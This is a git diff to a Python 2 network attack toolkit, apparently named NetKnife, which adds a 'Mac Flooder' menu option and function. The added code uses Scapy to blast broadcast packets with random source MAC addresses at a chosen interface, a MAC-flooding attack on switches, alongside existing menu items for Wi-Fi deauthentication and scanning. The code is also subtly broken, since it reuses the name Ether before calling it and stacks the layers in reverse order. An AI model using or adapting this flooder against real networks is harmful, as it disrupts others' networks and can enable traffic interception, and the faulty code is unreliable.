@@ -52,6 +52,8 @@ printer ("\033[91m[8]:Public IP Changer In 3 Per Second(Linux System-D Only)")
 printer ("\033[91m[9]:Wi-Fi Deauthentication Attacker Tools")
 printer ("\033[91m[10]:Tcp Port Scanner Tools")
 printer ("\033[91m[11]:Live IP And Device scanner")
+printer ("\033[91m[12]:Mac Flooder Tools")
+
 printer ("\033[91m[99]:Exit The NetKnife")
 print Fore.GREEN + ("--------------------------------------------------------------")
 
@@ -369,10 +371,26 @@ def NetScanner():
  	   print "{:16}      {}".format(client['IP Address'], client['Mac Address'])
 	   print "---------------------------------"
 	
-	
-	
+
 	
 
+
+def MacFlooder():
+    print """
+    '||\   /||`               '||''''| '||`                   ||`               
+     ||\\.//||                 ||  .    ||                    ||                
+     ||     ||   '''|.  .|'',  ||''|    ||  .|''|, .|''|, .|''||  .|''|, '||''| 
+     ||     ||  .|''||  ||     ||       ||  ||  || ||  || ||  ||  ||..||  ||    
+    .||     ||. `|..||. `|..' .||.     .||. `|..|' `|..|' `|..||. `|...  .||.   
+    """
+	
+    Iface = raw_input("Please Enter The Interface: ")
+    count = int(raw_input("Please Enter The Number Of Packet: "))
+    Ether = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
+    Arp = ARP(pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff")
+    sendp(Arp/Ether,iface=Iface,count=count,inter= .001)
+
+	
 
 TN = input ("[+]Please Enter the Tools Number: ")
 if TN == 1:
@@ -407,6 +425,8 @@ if TN == 10:
 	TCPPortScanner()
 if TN == 11:
 	NetScanner()
+if TN == 12:
+	MacFlooder()
 if TN == 99:
 	printer ("Exited The NetKnife")
 	sys.exit()
